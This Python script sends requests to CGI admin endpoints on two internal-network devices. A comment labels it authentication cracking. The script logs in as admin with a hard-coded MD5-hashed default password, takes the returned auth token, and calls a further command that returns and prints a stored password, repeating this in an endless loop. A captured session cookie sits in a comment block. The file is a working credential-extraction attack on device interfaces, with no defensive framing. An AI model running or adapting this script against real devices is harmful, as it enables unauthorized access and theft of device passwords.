import requests
import hashlib
import sys

def get():
    headers = {
        'Host': '192.168.13.105:5080',
        'Connection': 'Close',
        'Accept': '*/*',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
        'Accept-Language': 'zh-CN,zh;q=0.9',
    }

    url = 'http://192.168.13.105:5080/cgi-bin/rserver.cgi?action=256&user=admin&qtype=6&limit=12&offset=0&getall=0&filter=0'

    respObj = requests.get(url, headers)
    print(respObj.text)
    print( len(respObj.text) )
    print(respObj.headers)

#公司，192.168.12.20 鉴权破解

# Accept:*/*
# Accept-Encoding:gzip, deflate, sdch
# Accept-Language:zh-CN,zh;q=0.8
# Cache-Control:no-cache
# Cookie:ava.com.cn=ICo/U19BMWZneHBKQFJzPDUmICl5biZENHFxdkBHS0E
# Host:192.168.12.20
# If-Modified-Since:0
# Pragma:no-cache
# Proxy-Connection:keep-alive
# Referer:http://192.168.12.20/admin/test.html
# User-Agent:Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0
def get2(randStr:str):
    headers = {
        'Host': '192.168.12.20',
        'Connection': 'Close',
        'Accept': '*/*',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
        'Accept-Language': 'zh-CN,zh;q=0.9',
    }

    passwd = '123456'


    url = 'http://192.168.12.20/cgi-bin/plat/plat.cgi?action=1&cmd=25&username=admin&upswd='+hashlib.md5(passwd.encode("utf-8")).hexdigest()+'&app=0'

    respObj = requests.get(url, headers)
    print(respObj.text)
    print(respObj.headers)
    recvList = respObj.text.split('|')
    authWord = recvList[1];
    print(authWord)

    url = 'http://192.168.12.20/cgi-bin/plat.cgi?action=1&cmd=2305&key='+authWord+'&con=' + randStr
    respObj = requests.get(url, headers)
    passwd = respObj.text.split('|')[1]
    print('passwd:\n'+ passwd)



if __name__ == '__main__':
    if(len(sys.argv) == 2):
        get2(sys.argv[1])
    else:
        while True:
            get2('6dbkO9Mx49AR')